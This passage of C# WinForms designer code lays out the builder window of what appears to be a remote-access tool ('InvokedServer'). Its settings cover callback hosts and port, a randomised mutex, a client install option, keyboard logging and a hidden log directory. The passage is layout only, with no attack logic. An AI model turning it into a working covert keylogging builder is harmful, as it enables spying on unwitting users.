            this.guna2HtmlLabel9.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel9.Location = new System.Drawing.Point(35, 33);
            this.guna2HtmlLabel9.Name = "guna2HtmlLabel9";
            this.guna2HtmlLabel9.Size = new System.Drawing.Size(67, 15);
            this.guna2HtmlLabel9.TabIndex = 47;
            this.guna2HtmlLabel9.Text = "Install Client";
            // 
            // guna2GroupBox6
            // 
            this.guna2GroupBox6.BackColor = System.Drawing.Color.Transparent;
            this.guna2GroupBox6.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GroupBox6.BorderRadius = 2;
            this.guna2GroupBox6.Controls.Add(this.chkHideLogDirectory);
            this.guna2GroupBox6.Controls.Add(this.guna2HtmlLabel18);
            this.guna2GroupBox6.Controls.Add(this.txtLogDirectoryName);
            this.guna2GroupBox6.Controls.Add(this.label5);
            this.guna2GroupBox6.Controls.Add(this.chkKeylogger);
            this.guna2GroupBox6.Controls.Add(this.guna2HtmlLabel17);
            this.guna2GroupBox6.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GroupBox6.CustomBorderThickness = new System.Windows.Forms.Padding(0, 25, 0, 0);
            this.guna2GroupBox6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GroupBox6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GroupBox6.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.guna2GroupBox6.Location = new System.Drawing.Point(247, 9);
            this.guna2GroupBox6.Name = "guna2GroupBox6";
            this.guna2GroupBox6.Size = new System.Drawing.Size(234, 157);
            this.guna2GroupBox6.TabIndex = 63;
            this.guna2GroupBox6.Text = "Monitoring Settings";
            this.guna2GroupBox6.TextOffset = new System.Drawing.Point(0, -7);
            this.guna2GroupBox6.UseTransparentBackground = true;
            // 
            // chkHideLogDirectory
            // 
            this.chkHideLogDirectory.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkHideLogDirectory.CheckedState.BorderRadius = 2;
            this.chkHideLogDirectory.CheckedState.BorderThickness = 1;
            this.chkHideLogDirectory.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkHideLogDirectory.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkHideLogDirectory.Location = new System.Drawing.Point(7, 98);
            this.chkHideLogDirectory.Name = "chkHideLogDirectory";
            this.chkHideLogDirectory.Size = new System.Drawing.Size(18, 18);
            this.chkHideLogDirectory.TabIndex = 48;
            this.chkHideLogDirectory.Text = "guna2CustomCheckBox1";
            this.chkHideLogDirectory.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkHideLogDirectory.UncheckedState.BorderRadius = 2;
            this.chkHideLogDirectory.UncheckedState.BorderThickness = 1;
            this.chkHideLogDirectory.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkHideLogDirectory.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
            this.chkHideLogDirectory.Click += new System.EventHandler(this.chkHideLogDirectory_Click);
            // 
            // guna2HtmlLabel18
            // 
            this.guna2HtmlLabel18.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel18.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel18.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel18.Location = new System.Drawing.Point(31, 100);
            this.guna2HtmlLabel18.Name = "guna2HtmlLabel18";
            this.guna2HtmlLabel18.Size = new System.Drawing.Size(174, 15);
            this.guna2HtmlLabel18.TabIndex = 49;
            this.guna2HtmlLabel18.Text = "Set directory attributes to hidden";
            this.guna2HtmlLabel18.Click += new System.EventHandler(this.guna2HtmlLabel18_Click);
            // 
            // txtLogDirectoryName
            // 
            this.txtLogDirectoryName.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtLogDirectoryName.Animated = true;
            this.txtLogDirectoryName.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtLogDirectoryName.BorderRadius = 2;
            this.txtLogDirectoryName.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtLogDirectoryName.DefaultText = "";
            this.txtLogDirectoryName.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtLogDirectoryName.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtLogDirectoryName.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtLogDirectoryName.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtLogDirectoryName.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtLogDirectoryName.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtLogDirectoryName.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtLogDirectoryName.ForeColor = System.Drawing.Color.White;
            this.txtLogDirectoryName.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtLogDirectoryName.Location = new System.Drawing.Point(7, 72);
            this.txtLogDirectoryName.Name = "txtLogDirectoryName";
            this.txtLogDirectoryName.PlaceholderText = "[Name Of Your Directory]";
            this.txtLogDirectoryName.SelectedText = "";
            this.txtLogDirectoryName.Size = new System.Drawing.Size(214, 20);
            this.txtLogDirectoryName.TabIndex = 47;
            this.txtLogDirectoryName.TextChanged += new System.EventHandler(this.HasChangedSetting);
            this.txtLogDirectoryName.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtLogDirectoryName_KeyPress);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.ForeColor = System.Drawing.SystemColors.Control;
            this.label5.Location = new System.Drawing.Point(7, 53);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(113, 15);
            this.label5.TabIndex = 46;
            this.label5.Text = "Log Directory Name";
            // 
            // chkKeylogger
            // 
            this.chkKeylogger.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkKeylogger.CheckedState.BorderRadius = 2;
            this.chkKeylogger.CheckedState.BorderThickness = 1;
            this.chkKeylogger.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkKeylogger.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkKeylogger.Location = new System.Drawing.Point(7, 31);
            this.chkKeylogger.Name = "chkKeylogger";
            this.chkKeylogger.Size = new System.Drawing.Size(18, 18);
            this.chkKeylogger.TabIndex = 44;
            this.chkKeylogger.Text = "guna2CustomCheckBox1";
            this.chkKeylogger.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkKeylogger.UncheckedState.BorderRadius = 2;
            this.chkKeylogger.UncheckedState.BorderThickness = 1;
            this.chkKeylogger.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkKeylogger.CheckedChanged += new System.EventHandler(this.chkKeylogger_CheckedChanged);
            // 
            // guna2HtmlLabel17
            // 
            this.guna2HtmlLabel17.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel17.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel17.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel17.Location = new System.Drawing.Point(31, 32);
            this.guna2HtmlLabel17.Name = "guna2HtmlLabel17";
            this.guna2HtmlLabel17.Size = new System.Drawing.Size(133, 15);
            this.guna2HtmlLabel17.TabIndex = 45;
            this.guna2HtmlLabel17.Text = "Enable keyboard logging";
            // 
            // guna2GroupBox5
            // 
            this.guna2GroupBox5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2GroupBox5.BackColor = System.Drawing.Color.Transparent;
            this.guna2GroupBox5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GroupBox5.BorderRadius = 2;
            this.guna2GroupBox5.Controls.Add(this.numericUpDownDelay);
            this.guna2GroupBox5.Controls.Add(this.label7);
            this.guna2GroupBox5.Controls.Add(this.numericUpDownPort);
            this.guna2GroupBox5.Controls.Add(this.lstHosts);
            this.guna2GroupBox5.Controls.Add(this.btnAddHost);
            this.guna2GroupBox5.Controls.Add(this.label3);
            this.guna2GroupBox5.Controls.Add(this.txtHost);
            this.guna2GroupBox5.Controls.Add(this.label4);
            this.guna2GroupBox5.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GroupBox5.CustomBorderThickness = new System.Windows.Forms.Padding(0, 25, 0, 0);
            this.guna2GroupBox5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GroupBox5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GroupBox5.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.guna2GroupBox5.Location = new System.Drawing.Point(7, 171);
            this.guna2GroupBox5.Name = "guna2GroupBox5";
            this.guna2GroupBox5.Size = new System.Drawing.Size(474, 218);
            this.guna2GroupBox5.TabIndex = 62;
            this.guna2GroupBox5.Text = "Connection Settings";
            this.guna2GroupBox5.TextOffset = new System.Drawing.Point(0, -7);
            this.guna2GroupBox5.UseTransparentBackground = true;
            // 
            // numericUpDownDelay
            // 
            this.numericUpDownDelay.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.numericUpDownDelay.BackColor = System.Drawing.Color.Transparent;
            this.numericUpDownDelay.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.numericUpDownDelay.BorderRadius = 2;
            this.numericUpDownDelay.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.numericUpDownDelay.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.numericUpDownDelay.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.numericUpDownDelay.ForeColor = System.Drawing.SystemColors.Control;
            this.numericUpDownDelay.Location = new System.Drawing.Point(195, 170);
            this.numericUpDownDelay.Maximum = new decimal(new int[] {
            -1304428545,
            434162106,
            542,
            0});
            this.numericUpDownDelay.Name = "numericUpDownDelay";
            this.numericUpDownDelay.Size = new System.Drawing.Size(270, 23);
            this.numericUpDownDelay.TabIndex = 43;
            this.numericUpDownDelay.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.numericUpDownDelay.Value = new decimal(new int[] {
            5000,
            0,
            0,
            0});
            this.numericUpDownDelay.ValueChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.ForeColor = System.Drawing.SystemColors.Control;
            this.label7.Location = new System.Drawing.Point(195, 152);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(125, 15);
            this.label7.TabIndex = 42;
            this.label7.Text = "Connection Delay(ms)";
            // 
            // numericUpDownPort
            // 
            this.numericUpDownPort.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.numericUpDownPort.BackColor = System.Drawing.Color.Transparent;
            this.numericUpDownPort.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.numericUpDownPort.BorderRadius = 2;
            this.numericUpDownPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.numericUpDownPort.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.numericUpDownPort.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.numericUpDownPort.ForeColor = System.Drawing.SystemColors.Control;
            this.numericUpDownPort.Location = new System.Drawing.Point(195, 95);
            this.numericUpDownPort.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.numericUpDownPort.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.numericUpDownPort.Name = "numericUpDownPort";
            this.numericUpDownPort.Size = new System.Drawing.Size(270, 23);
            this.numericUpDownPort.TabIndex = 41;
            this.numericUpDownPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.numericUpDownPort.Value = new decimal(new int[] {
            4040,
            0,
            0,
            0});
            // 
            // lstHosts
            // 
            this.lstHosts.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.lstHosts.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.lstHosts.ContextMenuStrip = this.BuilderContextMenuStrip;
            this.lstHosts.ForeColor = System.Drawing.SystemColors.Control;
            this.lstHosts.FormattingEnabled = true;
            this.lstHosts.ItemHeight = 15;
            this.lstHosts.Location = new System.Drawing.Point(7, 30);
            this.lstHosts.Name = "lstHosts";
            this.lstHosts.Size = new System.Drawing.Size(179, 180);
            this.lstHosts.TabIndex = 38;
            // 
            // BuilderContextMenuStrip
            // 
            this.BuilderContextMenuStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.BuilderContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.BuilderContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem1,
            this.removeAllToolStripMenuItem});
            this.BuilderContextMenuStrip.Name = "ClientContextMenuStrip";
            this.BuilderContextMenuStrip.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.BuilderContextMenuStrip.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.BuilderContextMenuStrip.RenderStyle.ColorTable = null;
            this.BuilderContextMenuStrip.RenderStyle.RoundedEdges = true;
            this.BuilderContextMenuStrip.RenderStyle.SelectionArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.BuilderContextMenuStrip.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.BuilderContextMenuStrip.RenderStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.BuilderContextMenuStrip.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.BuilderContextMenuStrip.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.BuilderContextMenuStrip.Size = new System.Drawing.Size(144, 48);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem1.Image = global::InvokedServer.Properties.Resources.delete;
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(143, 22);
            this.toolStripMenuItem1.Text = "Remove host";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
            // 
            // removeAllToolStripMenuItem
            // 
            this.removeAllToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.removeAllToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.broom;
            this.removeAllToolStripMenuItem.Name = "removeAllToolStripMenuItem";
            this.removeAllToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
            this.removeAllToolStripMenuItem.Text = "Clear all";
            this.removeAllToolStripMenuItem.Click += new System.EventHandler(this.removeAllToolStripMenuItem_Click);
            // 
            // btnAddHost
            // 
            this.btnAddHost.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.btnAddHost.Animated = true;
            this.btnAddHost.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.btnAddHost.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.btnAddHost.BorderRadius = 2;
            this.btnAddHost.BorderThickness = 1;
            this.btnAddHost.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnAddHost.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnAddHost.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnAddHost.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnAddHost.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnAddHost.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.btnAddHost.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.btnAddHost.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.btnAddHost.ForeColor = System.Drawing.Color.White;
            this.btnAddHost.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnAddHost.Image = global::InvokedServer.Properties.Resources.add;
            this.btnAddHost.ImageSize = new System.Drawing.Size(16, 16);
            this.btnAddHost.Location = new System.Drawing.Point(195, 124);
            this.btnAddHost.Name = "btnAddHost";
            this.btnAddHost.Size = new System.Drawing.Size(270, 23);
            this.btnAddHost.TabIndex = 37;
            this.btnAddHost.Text = "Add Host";
            this.btnAddHost.Click += new System.EventHandler(this.btnAddHost_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.ForeColor = System.Drawing.SystemColors.Control;
            this.label3.Location = new System.Drawing.Point(196, 77);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(29, 15);
            this.label3.TabIndex = 35;
            this.label3.Text = "Port";
            // 
            // txtHost
            // 
            this.txtHost.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtHost.Animated = true;
            this.txtHost.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtHost.BorderRadius = 2;
            this.txtHost.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtHost.DefaultText = "";
            this.txtHost.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtHost.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtHost.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtHost.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtHost.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtHost.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtHost.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtHost.ForeColor = System.Drawing.Color.White;
            this.txtHost.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtHost.Location = new System.Drawing.Point(195, 49);
            this.txtHost.Name = "txtHost";
            this.txtHost.PlaceholderText = "[Your IP]";
            this.txtHost.SelectedText = "";
            this.txtHost.Size = new System.Drawing.Size(270, 23);
            this.txtHost.TabIndex = 34;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.ForeColor = System.Drawing.SystemColors.Control;
            this.label4.Location = new System.Drawing.Point(195, 32);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(77, 15);
            this.label4.TabIndex = 2;
            this.label4.Text = "IP/Hostname";
            // 
            // guna2GroupBox4
            // 
            this.guna2GroupBox4.BackColor = System.Drawing.Color.Transparent;
            this.guna2GroupBox4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GroupBox4.BorderRadius = 2;
            this.guna2GroupBox4.Controls.Add(this.btnMutex);
            this.guna2GroupBox4.Controls.Add(this.txtMutex);
            this.guna2GroupBox4.Controls.Add(this.label2);
            this.guna2GroupBox4.Controls.Add(this.txtTag);
            this.guna2GroupBox4.Controls.Add(this.label1);
            this.guna2GroupBox4.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GroupBox4.CustomBorderThickness = new System.Windows.Forms.Padding(0, 25, 0, 0);
            this.guna2GroupBox4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GroupBox4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GroupBox4.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.guna2GroupBox4.Location = new System.Drawing.Point(7, 9);
            this.guna2GroupBox4.Name = "guna2GroupBox4";
            this.guna2GroupBox4.Size = new System.Drawing.Size(234, 157);
            this.guna2GroupBox4.TabIndex = 61;
            this.guna2GroupBox4.Text = "Basic Settings";
            this.guna2GroupBox4.TextOffset = new System.Drawing.Point(0, -7);
            this.guna2GroupBox4.UseTransparentBackground = true;
            // 
            // btnMutex
            // 
            this.btnMutex.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.btnMutex.Animated = true;
            this.btnMutex.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.btnMutex.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.btnMutex.BorderRadius = 2;
            this.btnMutex.BorderThickness = 1;
            this.btnMutex.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnMutex.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnMutex.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnMutex.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnMutex.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnMutex.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.btnMutex.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.btnMutex.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.btnMutex.ForeColor = System.Drawing.Color.White;
            this.btnMutex.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnMutex.Image = global::InvokedServer.Properties.Resources.refresh;
            this.btnMutex.ImageSize = new System.Drawing.Size(16, 16);
            this.btnMutex.Location = new System.Drawing.Point(8, 123);
            this.btnMutex.Name = "btnMutex";
            this.btnMutex.Size = new System.Drawing.Size(216, 23);
            this.btnMutex.TabIndex = 37;
            this.btnMutex.Text = "Randomise";
            this.tooltip.SetToolTip(this.btnMutex, "Randomise Mutex");
            this.btnMutex.Click += new System.EventHandler(this.btnMutex_Click);
            // 
            // txtMutex
            // 
            this.txtMutex.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtMutex.Animated = true;
            this.txtMutex.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtMutex.BorderRadius = 2;
            this.txtMutex.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtMutex.DefaultText = "";
            this.txtMutex.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtMutex.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtMutex.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtMutex.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtMutex.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtMutex.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtMutex.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtMutex.ForeColor = System.Drawing.Color.White;
            this.txtMutex.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtMutex.Location = new System.Drawing.Point(8, 92);
            this.txtMutex.Name = "txtMutex";
            this.txtMutex.PlaceholderText = "[Random Mutex]";
            this.txtMutex.SelectedText = "";
            this.txtMutex.Size = new System.Drawing.Size(216, 23);
            this.txtMutex.TabIndex = 36;
            this.txtMutex.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.ForeColor = System.Drawing.SystemColors.Control;
            this.label2.Location = new System.Drawing.Point(8, 75);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(83, 15);
            this.label2.TabIndex = 35;
            this.label2.Text = "Process Mutex";
            // 
            // txtTag
            // 
            this.txtTag.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtTag.Animated = true;
            this.txtTag.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtTag.BorderRadius = 2;
            this.txtTag.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtTag.DefaultText = "";
            this.txtTag.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
